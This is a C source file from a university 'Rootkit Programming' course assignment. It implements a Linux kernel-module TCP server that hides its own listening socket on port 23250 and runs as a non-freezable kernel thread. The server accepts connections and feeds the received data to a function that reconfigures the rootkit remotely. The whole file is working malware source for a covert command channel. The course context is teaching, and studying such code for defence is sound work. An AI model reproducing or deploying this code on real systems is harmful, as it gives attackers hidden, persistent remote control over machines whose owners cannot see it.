
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 10                                                            */
/*                                                                             */
/*   Filename: tcp_server.c                                                    */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: January 2016                                                        */
/*                                                                             */
/*   Usage: ...                                                                */
/*                                                                             */
/*******************************************************************************/

#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/netdevice.h>

#include "socket_masking.h"
#include "conf_manager.h"


/*******************************************************************************/
/*                                                                             */
/*                       DEFINITIONS - DECLARATIONS                            */
/*                                                                             */
/*******************************************************************************/


/* Definition of macros */
#define PRINT(str) printk(KERN_INFO "rootkit tcp_server: %s\n", (str))
#define DEBUG_PRINT(str) if (show_debug_messages) PRINT(str)
#define LISTEN_PORT 23250
#define MODULE_NAME "rootkit"
#define CONF_BUFSIZE 1024


/* Definition of global variables */
static int show_debug_messages;
static struct kthread_t *kthread = NULL;


/* Definition of data structs */
struct kthread_t {
	int running;
	struct task_struct *thread;
	struct socket *sock;
	struct sockaddr_in addr;
};


/* Declaration of functions */
int tcp_server_init(int);
int tcp_server_exit(void);

static void ksocket_start(void);
static int ksocket_receive(struct socket *sock, struct sockaddr_in *, unsigned char *, int);
static int ksocket_send(struct socket *sock, struct sockaddr_in *, unsigned char *, int);


/*******************************************************************************/
/*                                                                             */
/*                                  CODE                                       */
/*                                                                             */
/*******************************************************************************/


int tcp_server_init(int debug_mode_on)
{
	show_debug_messages = debug_mode_on;

	mask_socket("tcp4", LISTEN_PORT);

	kthread = kmalloc(sizeof(struct kthread_t), GFP_KERNEL);
	memset(kthread, 0, sizeof(struct kthread_t));

	/* Start kernel thread */
	kthread->thread = kthread_run((void *) ksocket_start, NULL, MODULE_NAME);
	if (IS_ERR(kthread->thread)) {
		DEBUG_PRINT("[Error] unable to start kernel thread");
		kfree(kthread);
		kthread = NULL;
		return -ENOMEM;
	}

	DEBUG_PRINT("initialized");

	return 0;
}


int tcp_server_exit(void)
{
	//int err;

	if (kthread->thread == NULL)
		DEBUG_PRINT("no tcp server thread to kill");
	/*
	else {
		//mutex_lock(&fs_mutex);
		//stop_kthread(kthread);
		//err = kill_proc(kthread->thread->pid, SIGKILL, 1);
		//mutex_unlock(&fs_mutex);

		//Wait for kernel thread to die
		if (err < 0)
			DEBUG_PRINT("[Error] unknown error occured while trying to terminate tcp server thread");
		else {
			while (kthread->running == 1)
				msleep(10);
			DEBUG_PRINT("succesfully killed tcp server thread");
        }
	}
	*/

	/* Free allocated resources before exiting */
	if (kthread->sock != NULL) {
		sock_release(kthread->sock);
		kthread->sock = NULL;
	}

	kfree(kthread);
	kthread = NULL;

	DEBUG_PRINT("exited");

	return 0;
}


static void ksocket_start(void)
{
	int res;
	struct socket *accept;
	unsigned char buf[CONF_BUFSIZE+1];
	int size;

	/* Kernel thread initialization */
	//mutex_lock(&fs_mutex);
	kthread->running = 1;
	current->flags |= PF_NOFREEZE;

	/* Daemonize (take care with signals, after daemonize() they are disabled) */
	/*
	daemonize(MODULE_NAME);
	allow_signal(SIGKILL);
	mutex_unlock(&fs_mutex);
	*/

	/* Create listening socket */
	res = sock_create_kern(AF_INET, SOCK_STREAM, IPPROTO_TCP, &kthread->sock);
	if (res < 0) {
		DEBUG_PRINT("[Error] unable to create listening socket");
		goto out;
	}

	memset(&kthread->addr, 0, sizeof(struct sockaddr));
	kthread->addr.sin_family = AF_INET;
	kthread->addr.sin_addr.s_addr = htonl(INADDR_ANY);
	kthread->addr.sin_port = htons(LISTEN_PORT);

	res = kthread->sock->ops->bind(kthread->sock, (struct sockaddr *) &kthread->addr, sizeof(struct sockaddr));
	if (res < 0) {
		DEBUG_PRINT("[Error] unable to bind or connect to socket");
		goto close_and_out;
	}

	res = kthread->sock->ops->listen(kthread->sock, 1);
	if (res) {
		DEBUG_PRINT("[Error] unable to listen socket");
		goto close_and_out;
	}

	DEBUG_PRINT("started to listening on a port");

	/* Main loop */
	while (1) {
		DEBUG_PRINT("waiting for connections");
		
		res = sock_create_kern(PF_INET, SOCK_STREAM, IPPROTO_TCP, &accept);
		if (res < 0) {
			DEBUG_PRINT("[Error] unable to create accept socket");
			goto close_and_out;
		}

		res = accept->ops->accept(kthread->sock, accept, 0);
		if (res < 0) {
			DEBUG_PRINT("[Error] unable to accept socket");
			goto close_and_out;
		}

		memset(&buf, 0, CONF_BUFSIZE+1);
		size = ksocket_receive(accept, &kthread->addr, buf, CONF_BUFSIZE);

		if (signal_pending(current))
			break;

		if (size < 0)
			;
			//printk(KERN_INFO "rootkit tcp_server: [Error] unable to receive packet (sock_recvmsg error = %d)\n", size);
		else {
			//printk(KERN_INFO "rootkit tcp_server: received %d bytes\n", size);

			/* Process data */
			update_conf(buf);

			/* Respond back */
			memset(buf, 0, CONF_BUFSIZE+1);
			strcat(buf, "Updating rootkit configuration... [Done]");
			ksocket_send(accept, NULL, buf, strlen(buf));
		}

		sock_release(accept);
		accept = NULL;
	}

	close_and_out:
		sock_release(kthread->sock);
		kthread->sock = NULL;
	out:
		kthread->thread = NULL;
		kthread->running = 0;
}


static int ksocket_receive(struct socket* sock, struct sockaddr_in* addr, unsigned char* buf, int len)
{
	int size;
	struct iovec iov;
	struct msghdr msg;
	mm_segment_t oldfs;

	if (sock->sk == NULL)
		return 0;

	size = 0;

	iov.iov_base = buf;
	iov.iov_len = len;

	msg.msg_flags = 0;
	msg.msg_name = addr;
	msg.msg_namelen = sizeof(struct sockaddr_in);
	msg.msg_control = NULL;
	msg.msg_controllen = 0;
	//msg.msg_iov = &iov;
	//msg.msg_iovlen = 1;
	iov_iter_init(&msg.msg_iter, READ, &iov, 1, len);

	oldfs = get_fs();
	set_fs(KERNEL_DS);
	size = sock_recvmsg(sock, &msg, len, msg.msg_flags);
	set_fs(oldfs);

	return size;
}


static int ksocket_send(struct socket *sock, struct sockaddr_in *addr, unsigned char *buf, int len)
{
	int size;
	struct iovec iov;
	struct msghdr msg;
	mm_segment_t oldfs;

	if (sock->sk == NULL)
		return 0;

	size = 0;

	iov.iov_base = buf;
	iov.iov_len = len;

	msg.msg_flags = 0;
	msg.msg_name = addr;
	// TODO: fix below
	msg.msg_namelen = 0; //sizeof(struct sockaddr_in);
	msg.msg_control = NULL;
	msg.msg_controllen = 0;
	//msg.msg_iov = &iov;
	//msg.msg_iovlen = 1;
	iov_iter_init(&msg.msg_iter, WRITE, &iov, 1, len);

	oldfs = get_fs();
	set_fs(KERNEL_DS);
	size = sock_sendmsg(sock, &msg);
	set_fs(oldfs);

	return size;
}
